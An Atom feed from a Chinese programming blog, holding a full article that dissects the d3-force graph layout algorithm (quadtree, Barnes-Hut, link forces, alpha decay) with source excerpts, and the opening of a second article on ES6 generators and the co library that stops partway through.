<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Reducer</title>
  <subtitle>Where there is a will, there is a way.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blackganglion.com/"/>
  <updated>2016-09-06T17:19:22.000Z</updated>
  <id>http://blackganglion.com/</id>
  
  <author>
    <name>淡苍</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>d3-force力导引布局原理与剖析(一)</title>
    <link href="http://blackganglion.com/2016/09/07/d3-force%E5%8A%9B%E5%AF%BC%E5%BC%95%E5%B8%83%E5%B1%80%E5%8E%9F%E7%90%86%E4%B8%8E%E5%89%96%E6%9E%901/"/>
    <id>http://blackganglion.com/2016/09/07/d3-force力导引布局原理与剖析1/</id>
    <published>2016-09-06T16:22:06.000Z</published>
    <updated>2016-09-06T17:19:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>在数据可视化中，我们往往会使用图来表达数据中所蕴含的信息。而图布局算法可以使散乱的信息 (信息多以点线的关系承载) 通过一种清晰的方式呈现出来，并符合相应的美学标准。在图布局算法模型中，其建立在粒子物理理论的基础上，将节点模拟成为原子，通过原子间的引力和斥力来得到节点的速度与加速度，计算其移动方位与距离，最终达到一个稳定平衡的状态，从而完成布局。以下就是由 d3 实现的力引导布局:</p>
<p><img src="/images/24-1.png" alt="d3-force"></p>
<p>在 d3 的实现中，为了达到性能与效果的平衡，节点与节点间模拟同种电荷相互排斥，并将节点存入四叉树中，利用 Barnes–Hut 近似来减少节点间电荷斥力的计算量。同时连线间的节点模拟弹簧牵引力，节点的速度综合斥力引力得出，并发生阻尼衰减，最终达到整图平衡。</p>
<p>在本文中，我们将对 d3 实现的力导引布局进行一步步分解，详细剖析其实现过程与背后的原理。在此之前，读者们自行阅读上图实现<a href="http://bl.ocks.org/mbostock/4062045" target="_blank" rel="external">源码</a>，熟悉一下 <a href="https://github.com/d3/d3-force" target="_blank" rel="external">d3-force</a> API。</p>
<a id="more"></a>
<h2 id="节点的处理与优化"><a href="#节点的处理与优化" class="headerlink" title="节点的处理与优化"></a>节点的处理与优化</h2><h3 id="初始化导入节点"><a href="#初始化导入节点" class="headerlink" title="初始化导入节点"></a>初始化导入节点</h3><p>首先，需要将节点形成所符合的数据结构导入 d3 当中，对于每一个节点进行预处理，节点按一定的半径和旋转角度环绕起来，vx 与 vy 分别表示节点在 x 轴和 y 轴方向上的速度分量。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> initialRadius = <span class="number">10</span>,</div><div class="line">    initialAngle = <span class="built_in">Math</span>.PI * (<span class="number">3</span> - <span class="built_in">Math</span>.sqrt(<span class="number">5</span>));</div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, n = nodes.length, node; i &lt; n; ++i) &#123;</div><div class="line">  node = nodes[i], node.index = i;</div><div class="line">  ...</div><div class="line">    var radius = initialRadius * <span class="built_in">Math</span>.sqrt(i), angle = i * initialAngle;</div><div class="line">    node.x = radius * <span class="built_in">Math</span>.cos(angle);</div><div class="line">    node.y = radius * <span class="built_in">Math</span>.sin(angle);</div><div class="line">  ...</div><div class="line">    node.vx = node.vy = <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="建立节点四叉树"><a href="#建立节点四叉树" class="headerlink" title="建立节点四叉树"></a>建立节点四叉树</h3><p>四叉树 (Q-Tree) 是一种树形数据结构。它的每个节点下至多可以有四个子节点，通常把一部分二维空间细分为四个象限并把该区域里的相关信息存入到四叉树节点中。四叉树的每一个节点代表一个矩形区域，每一个矩形区域又可划分为四个小矩形区域，这四个小矩形区域作为四个子节点所代表的矩形区域，正如下图的矩阵虚线划分:</p>
<p><img src="/images/24-2.png" alt="节点初始与四叉树划分"></p>
<p>遍历导入所有节点数据，求出节点最小 x 值 $x_0$ ，最大 x 值 $x_1$，最小 y 值 $y_0$，最大 y 值 $y_1$，将 $(x_0, y_0)$ 点坐标以 $2$ 倍增，使 $x_0 * 2^n \geq x_1, y_0 * 2^n \geq y_1$，那么新 $(x_1, y_1)$ 为 $(x_0 * 2^n, y_0 * 2^n)$。以 $2$ 倍增符合四叉树在一维上不断对半划分的特点。</p>
<p>一边添加节点，一边对四叉树进行划分，因此一般来说四叉树是不完全的。在添加时会遇到如下 4 种情况:</p>
<p><strong>case1:</strong> 当前四叉树为空，直接将当前节点作为树的根节点。<br><strong>case2:</strong> 当前查询节点为真实节点(对象节点)，即与添加节点所处范围矩阵一致，需要建立数组索引，即再次划分该矩阵，直到查询节点与添加节点分处不同矩阵。<br><strong>case3:</strong> 当前查询节点为索引节点(数组节点)，且添加节点所处范围矩阵为空，直接添加。<br><strong>case4:</strong> 当前查询节点为真实节点，且添加节点的坐标与其完全相等，直接下挂。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">tree, x, y, d</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> node = tree._root,</div><div class="line">      leaf = &#123;data: d&#125;,</div><div class="line">      x0 = tree._x0,</div><div class="line">      y0 = tree._y0,</div><div class="line">      x1 = tree._x1,</div><div class="line">      y1 = tree._y1,</div><div class="line">      ...</div><div class="line"></div><div class="line">  <span class="comment">// 当前tree._root为空，对于case1</span></div><div class="line">  <span class="comment">// If the tree is empty, initialize the root as a leaf.</span></div><div class="line">  <span class="keyword">if</span> (!node) <span class="keyword">return</span> tree._root = leaf, tree;</div><div class="line"></div><div class="line">  <span class="comment">// 类似与二分查找，自顶向下搜索</span></div><div class="line">  <span class="comment">// Find the existing leaf for the new point, or add it.</span></div><div class="line">  <span class="keyword">while</span> (node.length) &#123;</div><div class="line">    <span class="keyword">if</span> (right = x &gt;= (xm = (x0 + x1) / <span class="number">2</span>)) x0 = xm; <span class="keyword">else</span> x1 = xm;</div><div class="line">    <span class="keyword">if</span> (bottom = y &gt;= (ym = (y0 + y1) / <span class="number">2</span>)) y0 = ym; <span class="keyword">else</span> y1 = ym;</div><div class="line">    </div><div class="line">    <span class="comment">// 判断当前添加节点所处象限是否为空，对应case3</span></div><div class="line">    <span class="keyword">if</span> (parent = node, !(node = node[i = bottom &lt;&lt; <span class="number">1</span> | right])) <span class="keyword">return</span> parent[i] = leaf, tree;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// node为查询节点</span></div><div class="line">  <span class="comment">// Is the new point is exactly coincident with the existing point?</span></div><div class="line">  xp = +tree._x.call(<span class="literal">null</span>, node.data);</div><div class="line">  yp = +tree._y.call(<span class="literal">null</span>, node.data);</div><div class="line">  <span class="comment">// 特殊情况，若当前需要加入的节点与父节点完全重合，对应case4</span></div><div class="line">  <span class="keyword">if</span> (x === xp &amp;&amp; y === yp) <span class="keyword">return</span> leaf.next = node, parent ? parent[i] = leaf : tree._root = leaf, tree;</div><div class="line"></div><div class="line">  <span class="comment">// 不停分割，直至处于不同象限，对应case2</span></div><div class="line">  <span class="comment">// Otherwise, split the leaf node until the old and new point are separated.</span></div><div class="line">  <span class="keyword">do</span> &#123;</div><div class="line">    parent = parent ? parent[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">4</span>) : tree._root = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">4</span>);</div><div class="line">    <span class="keyword">if</span> (right = x &gt;= (xm = (x0 + x1) / <span class="number">2</span>)) x0 = xm; <span class="keyword">else</span> x1 = xm;</div><div class="line">    <span class="keyword">if</span> (bottom = y &gt;= (ym = (y0 + y1) / <span class="number">2</span>)) y0 = ym; <span class="keyword">else</span> y1 = ym;</div><div class="line">  &#125; <span class="keyword">while</span> ((i = bottom &lt;&lt; <span class="number">1</span> | right) === (j = (yp &gt;= ym) &lt;&lt; <span class="number">1</span> | (xp &gt;= xm)));</div><div class="line">  <span class="keyword">return</span> parent[j] = node, parent[i] = leaf, tree;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="/images/24-3.png" alt="四叉树添加节点模拟"></p>
<p>四叉树的构建完成后，自四叉树由下而上，求所有节点的合坐标与合静电电荷量。若当前节点 $quad$ 为索引节点，其中 strength 为静电电荷量，默认值均为 -30，可由开发者自定义。</p>
<p>合坐标公式: $(quad.x = \frac{\sum\limits_{i=0}^{3} (quad[i].value * quad[i].x)}{\sum\limits_{i=0}^{3} (quad[i].value)}, quad.y = \frac{\sum\limits_{i=0}^{3} (quad[i].value * quad[i].y)}{\sum\limits_{i=0}^{3} (quad[i].value)})$</p>
<p>合电荷量公式: $\sum\limits_{i=0}^{3} (quad[i].value)$</p>
<p>若当前节点为真实节点，坐标即为当前真实节点坐标，静电电荷量则为真实节点及其下挂真实节点 strength 总和。</p>
<h3 id="斥力的优化求解"><a href="#斥力的优化求解" class="headerlink" title="斥力的优化求解"></a>斥力的优化求解</h3><p>节点间的关键就在于电荷斥力的求解。在原来的朴素算法中，需要每个节点对其他所有节点求解斥力，算法复杂度为 $O(n^2)$，而目前采用四叉树与 Barnes-Hut 近似，算法复杂度 $O(nlogn)$，其核心思想在于，当前节点 (node) 计算远处节点的斥力对速度位移影响时，可将其周围相近的点产生的相同斥力效果做整合处理，形成”质心”，而这个”周围”的大小就由四叉树的矩阵与 Barnes-Hut 近似精度 theta 所决定，theta 默认值为 $(0.9)^2$。</p>
<p>当前象限区域面积 $S_1$ 为 $(x_1 - x_2)^2$，当前节点 (node) 与象限合节点 (quad) 形成矩阵面积 $S_2$ 为 $(quad.x - node.x) * (quad.y - node.y)$，当 $\frac{S_1}{S_2} &lt; theta$ 时，计算当前节点与象限合节点的相互作用力，将其转化为 node 速度变化量:</p>
<p>根据 <strong>Velocity Verlet</strong> 算法， $v(t + \Delta t) = v(t) + \frac{f(t + \Delta t) + f(t)}{2m}\Delta t$，d3 进行了简化处理，设 $m = 1, \Delta t = 1$:</p>
<p>$\Delta v = v(t + \Delta t) - v(\Delta t) = \frac{f(t + \Delta t) + f(t)}{2m}\Delta t \approx f(t)$</p>
<p>而在 d3 源码中，$node.vx += (\frac{x * quad.value}{x^2 + y^2}) * alpha$，alpha 是阻尼衰减系数。暂时无法理解这个求解过程，按照电场力求解公式 $F = \frac{kQq}{r^2}$ 推导，再将力分解到 x 轴，与现有求解不符，已提 issue 给代码的作者，希望能得到他的解答。</p>
<p>具体代码如下，apply 函数第一个参数 quad 为四叉树索引节点，内有索引下属子节点的合坐标 $(quad.x, quad.y)$ 和合电荷量。其返回 true 意味着，当前节点及其子节点已完成计算，否则需要继续向下遍历节点。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> distanceMin2 = <span class="number">1</span>,</div><div class="line">    distanceMax2 = <span class="literal">Infinity</span>,</div><div class="line">    theta2 = <span class="number">0.81</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">apply</span>(<span class="params">quad, x1, _, x2</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (!quad.value) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line"></div><div class="line">  <span class="keyword">var</span> x = quad.x - node.x,</div><div class="line">      y = quad.y - node.y,</div><div class="line">      w = x2 - x1,</div><div class="line">      l = x * x + y * y;</div><div class="line">      </div><div class="line">  <span class="comment">// 是否可采用 Barnes-Hut 近似</span></div><div class="line">  <span class="comment">// Apply the Barnes-Hut approximation if possible.</span></div><div class="line">  <span class="comment">// Limit forces for very close nodes; randomize direction if coincident.</span></div><div class="line">  <span class="keyword">if</span> (w * w / theta2 &lt; l) &#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; distanceMax2) &#123;</div><div class="line">      <span class="keyword">if</span> (x === <span class="number">0</span>) x = jiggle(), l += x * x;</div><div class="line">      <span class="keyword">if</span> (y === <span class="number">0</span>) y = jiggle(), l += y * y;</div><div class="line">      <span class="keyword">if</span> (l &lt; distanceMin2) l = <span class="built_in">Math</span>.sqrt(distanceMin2 * l);</div><div class="line">      node.vx += x * quad.value * alpha / l;</div><div class="line">      node.vy += y * quad.value * alpha / l;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// 无法采用 Barnes-Hut 近似且 quad 有节点，或 l 大于距离上限，需要继续向下遍历</span></div><div class="line">  <span class="comment">// Otherwise, process points directly.</span></div><div class="line">  </div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (quad.length || l &gt;= distanceMax2) <span class="keyword">return</span>;</div><div class="line">  </div><div class="line">  <span class="comment">// 排除自身对自身影响</span></div><div class="line">  <span class="comment">// Limit forces for very close nodes; randomize direction if coincident.</span></div><div class="line">  <span class="keyword">if</span> (quad.data !== node || quad.next) &#123;</div><div class="line">    <span class="keyword">if</span> (x === <span class="number">0</span>) x = jiggle(), l += x * x;</div><div class="line">    <span class="keyword">if</span> (y === <span class="number">0</span>) y = jiggle(), l += y * y;</div><div class="line">    <span class="keyword">if</span> (l &lt; distanceMin2) l = <span class="built_in">Math</span>.sqrt(distanceMin2 * l);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">do</span> <span class="keyword">if</span> (quad.data !== node) &#123;</div><div class="line">    w = strengths[quad.data.index] * alpha / l;</div><div class="line">    node.vx += x * w;</div><div class="line">    node.vy += y * w;</div><div class="line">  &#125; <span class="keyword">while</span> (quad = quad.next);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="节点连线的处理"><a href="#节点连线的处理" class="headerlink" title="节点连线的处理"></a>节点连线的处理</h2><p>相比节点的处理而言，节点的连线简单了许多，没有使用任何优化，先初始化连线，统计每个节点的度，求每一条边的起点 (source) 度的占比，使 bias = 起点度 / (起点度 + 终点度)。每条边的默认长度 (distance) 为30，默认弹簧劲度系数 (strength) 为 1 / min(起点度, 终点度)，这是为了减小对于度较大节点的引力，提高稳定性。</p>
<p>遍历所有连线，计算施加在连线两端节点的引力，最终推导出速度的变化:</p>
<p>$target.vx -= k * \Delta x * cos\theta * alpha * bias$ </p>
<p>$= strengths[i] * (l - distances[i]) * \frac{x}{\sqrt{x^2 + y^2}} * alpha * bias$</p>
<p>target.vy、source.vx、source.vy 同理。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> iterations = <span class="number">1</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">force</span>(<span class="params">alpha</span>) </span>&#123;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0</span>, n = links.length; k &lt; iterations; ++k) &#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, link, source, target, x, y, l, b; i &lt; n; ++i) &#123;</div><div class="line">      link = links[i], source = link.source, target = link.target;</div><div class="line">      x = target.x + target.vx - source.x - source.vx || jiggle();</div><div class="line">      y = target.y + target.vy - source.y - source.vy || jiggle();</div><div class="line">      l = <span class="built_in">Math</span>.sqrt(x * x + y * y);</div><div class="line">      l = (l - distances[i]) / l * alpha * strengths[i];</div><div class="line">      x *= l, y *= l;</div><div class="line">      target.vx -= x * (b = bias[i]);</div><div class="line">      target.vy -= y * b;</div><div class="line">      source.vx += x * (b = <span class="number">1</span> - b);</div><div class="line">      source.vy += y * b;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="布局的形成"><a href="#布局的形成" class="headerlink" title="布局的形成"></a>布局的形成</h2><p>布局的形成主要依靠不断的迭代计算，每处理一次节点与节点连线称为一步，循环往复，通过 alpha 逐渐衰减与 (fx, fy) 来进行控制。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> simulation,</div><div class="line">    alpha = <span class="number">1</span>,</div><div class="line">    alphaMin = <span class="number">0.001</span>,</div><div class="line">    <span class="comment">// alpha衰减率</span></div><div class="line">    alphaDecay = <span class="number">1</span> - <span class="built_in">Math</span>.pow(alphaMin, <span class="number">1</span> / <span class="number">300</span>),</div><div class="line">    alphaTarget = <span class="number">0</span>,</div><div class="line">    <span class="comment">// 速度衰减</span></div><div class="line">    velocityDecay = <span class="number">0.6</span>,</div><div class="line">    stepper = timer(step),</div><div class="line">    <span class="comment">// tick事件与end事件</span></div><div class="line">    event = dispatch(<span class="string">"tick"</span>, <span class="string">"end"</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">step</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  tick();</div><div class="line">  event.call(<span class="string">"tick"</span>, simulation);</div><div class="line">  <span class="keyword">if</span> (alpha &lt; alphaMin) &#123;</div><div class="line">    stepper.stop();</div><div class="line">    event.call(<span class="string">"end"</span>, simulation);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">tick</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="comment">// alpha不断衰减</span></div><div class="line">  alpha += (alphaTarget - alpha) * alphaDecay;</div><div class="line"></div><div class="line">  <span class="comment">// 不停迭代</span></div><div class="line">  forces.each(<span class="function"><span class="keyword">function</span>(<span class="params">force</span>) </span>&#123;</div><div class="line">    force(alpha);</div><div class="line">  &#125;);</div><div class="line"></div><div class="line">  <span class="comment">// 速度转化为距离改变</span></div><div class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; ++i) &#123;</div><div class="line">    node = nodes[i];</div><div class="line">    <span class="keyword">if</span> (node.fx == <span class="literal">null</span>) node.x += node.vx *= velocityDecay;</div><div class="line">    <span class="comment">// 具有fx，说明当前节点被控制，不需要受到力的影响，速度置为0</span></div><div class="line">    <span class="keyword">else</span> node.x = node.fx, node.vx = <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (node.fy == <span class="literal">null</span>) node.y += node.vy *= velocityDecay;</div><div class="line">    <span class="keyword">else</span> node.y = node.fy, node.vy = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>d3-force 的实现与传统图力导引布局中的 FR 算法具有完全相同的算法思路，均将迭代分为三部分，先计算节点之间相互的排斥力，然后是计算图中有边连接的节点之间相互的吸引力，最后综合吸引力和排斥力，来得到每个节点的速度，而不是加速度。同时采用类似于模拟退火的衰减方案，使布局趋于稳定。</p>
<p>在力的求解方式上，d3 的实现与 FR 的求解有所不同，对于 FR 中引力和斥力的公式推导也暂时没有想明白，这是一个优化点。此外，d3 中包括节点的静电电荷量，连线弹簧的长度、劲度系数，连线引力的迭代次数目前都采用了默认值，可否进行调整，这也是一个优化点。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/d3/d3-force" target="_blank" rel="external">d3-force doc</a><br><a href="https://github.com/d3/d3-quadtree" target="_blank" rel="external">d3-quadtree doc</a><br><a href="https://en.wikipedia.org/wiki/Verlet_integration#Velocity_Verlet" target="_blank" rel="external">Velocity_Verlet wiki</a><br><a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.32.1594&amp;rep=rep1&amp;type=pdf" target="_blank" rel="external">A Multilevel Algorithm for Force-Directed Graph Drawing</a><br><a href="http://www.docin.com/p-834916360.html" target="_blank" rel="external">图布局力导引算法研究与实现</a><br><a href="http://www.docin.com/p-215443388.html" target="_blank" rel="external">基于Barnes Hut算法的N-body问题模拟</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在数据可视化中，我们往往会使用图来表达数据中所蕴含的信息。而图布局算法可以使散乱的信息 (信息多以点线的关系承载) 通过一种清晰的方式呈现出来，并符合相应的美学标准。在图布局算法模型中，其建立在粒子物理理论的基础上，将节点模拟成为原子，通过原子间的引力和斥力来得到节点的速度与加速度，计算其移动方位与距离，最终达到一个稳定平衡的状态，从而完成布局。以下就是由 d3 实现的力引导布局:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/24-1.png&quot; alt=&quot;d3-force&quot;&gt;&lt;/p&gt;
&lt;p&gt;在 d3 的实现中，为了达到性能与效果的平衡，节点与节点间模拟同种电荷相互排斥，并将节点存入四叉树中，利用 Barnes–Hut 近似来减少节点间电荷斥力的计算量。同时连线间的节点模拟弹簧牵引力，节点的速度综合斥力引力得出，并发生阻尼衰减，最终达到整图平衡。&lt;/p&gt;
&lt;p&gt;在本文中，我们将对 d3 实现的力导引布局进行一步步分解，详细剖析其实现过程与背后的原理。在此之前，读者们自行阅读上图实现&lt;a href=&quot;http://bl.ocks.org/mbostock/4062045&quot;&gt;源码&lt;/a&gt;，熟悉一下 &lt;a href=&quot;https://github.com/d3/d3-force&quot;&gt;d3-force&lt;/a&gt; API。&lt;/p&gt;
    
    </summary>
    
      <category term="数据可视化" scheme="http://blackganglion.com/categories/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/"/>
    
    
      <category term="d3" scheme="http://blackganglion.com/tags/d3/"/>
    
  </entry>
  
  <entry>
    <title>深入理解generator与co源码解析</title>
    <link href="http://blackganglion.com/2016/08/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3generator%E4%B8%8Eco%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <id>http://blackganglion.com/2016/08/01/深入理解generator与co源码解析/</id>
    <published>2016-07-31T17:43:22.000Z</published>
    <updated>2016-07-31T17:49:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="初识generator"><a href="#初识generator" class="headerlink" title="初识generator"></a>初识generator</h2><p><code>generator</code>是ES6的新特性，也是一种异步编程的解决方案。generator函数通过<code>function*()</code>来表示，它相当于一个状态机，在内部通过yield来标识每一个状态。generator函数的返回值是一个指向内部状态的指针，我们将它命名为指针g。</p>
<p>在generator函数内部，凡是遇到yield标记的语句都会被阻塞。它们的控制权完全交给指针g，当指针g执行next时，相当于恢复generator的执行，相应的，next操作会返回一个包含value和done的对象。若当前generator执行完成，也就是之后没有yield语句了，value返回undefind，done返回true，告诉next执行完成。如果后面会被阻塞，则done返回false，value则为yield后面语句的值。next可被传入值，所传入的值将作为yield的返回值。具体执行流程可见下图:</p>
<p><img src="/images/23-1.jpg" alt="generator"></p>
<p><strong>注意一种特殊情况:</strong> 当generator函数内部有return时，返回<code>{ value: return值, done: true }</code>，结束generator的执行。</p>
<a id="more"></a>
<h2 id="从异步到同步"><a href="#从异步到同步" class="headerlink" title="从异步到同步"></a>从异步到同步</h2><p>开头我们提到generator是异步编程的解决方案，那么generator是如何将异步改变为同步的？我们通过一些简明的generator实例来说明问题。</p>
<p><strong>yield 数字、字符串、普通函数</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> gen = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">var</span> res1 = <span class="keyword">yield</span> <span class="number">1</span>;</div><div class="line">  <span class="built_in">console</span>.log(res1);</div><div class="line">  <span class="keyword">var</span> res2 = <span class="keyword">yield</span> <span class="string">'2'</span>;</div><div class="line">  <span class="built_in">console</span>.log(res2);</div><div class="line">  <span class="keyword">var</span> res3 = <span class="keyword">yield</span> (() =&gt; <span class="string">'3'</span>)()</div><div class="line">  <span class="built_in">console</span>.log(res3);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> g = gen();</div><div class="line"></div><div class="line"><span class="keyword">var</span> value = g.next().value;</div><div class="line"><span class="keyword">while</span>(value) &#123;</div><div class="line">  value = g.next(value).value;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>对于数字、字符和普通函数而言，并没有异步同步的概念，需要清楚的是yield后表达式的值只是作为g.next()返回值中的value，不会直接作为yield的返回值。</p>
<p><strong>yield Callback函数</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">readFile</span>(<span class="params">fileName</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    fs.readFile(fileName, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</div><div class="line">      callback(err, data.toString());</div><div class="line">    &#125;);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> gen = <span class="function"><span class="keyword">function</span>*(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> res1 = <span class="keyword">yield</span> readFile(<span class="string">'1.txt'</span>);</div><div class="line">  <span class="built_in">console</span>.log(res1);  <span class="comment">// 1.txt中的内容</span></div><div class="line">  <span class="keyword">var</span> res2 = <span class="keyword">yield</span> readFile(<span class="string">'2.txt'</span>);</div><div class="line">  <span class="built_in">console</span>.log(res2);  <span class="comment">// 2.txt中的内容</span></div><div class="line">  <span class="keyword">return</span> <span class="string">'test3'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> g = gen();</div><div class="line"></div><div class="line">g.next().value(<span class="function"><span class="keyword">function</span>(<span class="params">err, res</span>) </span>&#123;</div><div class="line">  g.next(res).value(<span class="function"><span class="keyword">function</span>(<span class="params">err, res</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(g.next(res)); <span class="comment">// &#123; value: 'test3', done: true &#125;</span></div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>一般的callback函数的形式是这样的:</p>
